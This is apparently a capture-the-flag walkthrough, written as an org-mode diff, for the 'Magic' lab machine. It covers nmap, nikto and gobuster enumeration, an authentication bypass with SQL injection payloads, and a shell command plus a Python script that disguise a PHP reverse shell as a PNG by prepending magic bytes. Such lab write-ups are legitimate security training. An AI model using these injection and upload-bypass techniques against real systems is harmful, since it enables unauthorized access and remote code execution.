@@ -1,0 +1,119 @@
+#+title: Magic
+
+* Initial enumeration
+
+We will start with a network scanning with the classic nmap command:
+
+#+begin_src shell
+nmap -sC -sV -oN nmap/initial 10.10.10.185
+#+end_src
+
+The options that we are using are:
+- sC: for the default scripts
+- sV: for version enumeration
+- oN: for saving the output
+
+You could also use:
+- v: for verbose to view the output while it's running since this could take
+  a while
+
+We have 22(ssh) and 80(HTTP) open with Apache/2.4.29.
+
+If we go to the page we can see that it's a lot of images and GIF, we can
+also view the source but there really not a lot there except for a little hash
+in the footer of the page.
+
+Now we can use:
+#+begin_src shell
+nikto -host 'http://10.10.10.185/' | tee nikto.log
+#+end_src
+
+Nikto is a web scanner that can tell us a lot about the vulnerabilities
+of a given site.
+
+You can read all about it here https://github.com/sullo/nikto/wiki.
+Tee is used to output into a file while, at the same time, it's displayed in
+our console.
+
+Also we will use:
+#+begin_src shell
+gobuster dir -u 'http://10.10.10.185/'
+-w /opt/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
+#+end_src
+
+This is a tool for brute forcing directories in a domain and it's subdomains.
+It uses a wordlist as an input and compares them so we have to provide that.
+Mine is in there but yours could be in a different place so keep that in mind.
+Also if you do not have this wordlists you
+can download them from: https://github.com/danielmiessler/SecLists
+
+We can look at the hash that was in the footer using:
+#+begin_src shell :results output :wrap "quote" :exports both
+echo 4d61676963 | xxd -r -p
+#+end_src
+
+#+RESULTS:
+#+begin_quote
+Magic
+#+end_quote
+
+So nothing particularly useful.
+
+* Initial access
+
+We can also try default credentials in the login page like "admin" or "root" but
+there doesn't seem to be anything there.
+
+But we can also try basic SQL injection like:
+" OR 1=1 --
+or:
+' OR 1=1 #
+And this last one worked so we now have access to the page and we can see
+that it wants us to upload an image.
+
+Now we can try to leverage the ability to upload files to use a reverse shell in
+the server. We know it's using PHP so we need a PHP reverse shell. You can use
+different scripts for this. I will use this:
+https://github.com/pentestmonkey/php-reverse-shell
+
+I'll modify the IP address in the script with mine. You can look yours with:
+#+begin_src shell
+ip a s tun0
+#+end_src
+
+The problem is that it only allows images and even if we change the file
+extension of the script it does not permit it.
+
+What we can do is look for what is recognized as an image file. In other
+words, what is it that it is being used to verify that is an image.
+If we look for the headers of a PNG file, that are used by the OS to
+know what kind of file it is, we can know that every one of these files starts
+with a series of bytes. These are 89 50 4e 47 0d 0a 1a 0a. But we can't just
+create a new file, paste this and write our code below. We need the raw bytes.
+So we can reuse the xxd command:
+#+begin_src shell
+echo 89504e470d0a1a0a | xxd -r -p > pngheader
+#+end_src
+
+If we concatenate that pngheader file with our script we could bypass the checks.
+But if we simply call it php-reverse-shell.png it will not know what to do with it.
+Since this is not a valid PNG file. But if we add .php as a first extension the
+server will be able to execute it.
+
+So:
+#+begin_src shell
+cat pngheader php-reverse-shell.php > reverse-shell.php.png
+#+end_src
+
+We could also do this with a simple python script:
+#+begin_src python :tangle magic.py :comments link
+#!/usr/bin/env python3
+
+magic = bytearray([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
+
+with open("php-reverse-shell.php", "rb") as h:
+    content = h.read()
+
+with open("reverse-shell.php.png", "wb") as h:
+    h.write(magic + content)
+#+end_src
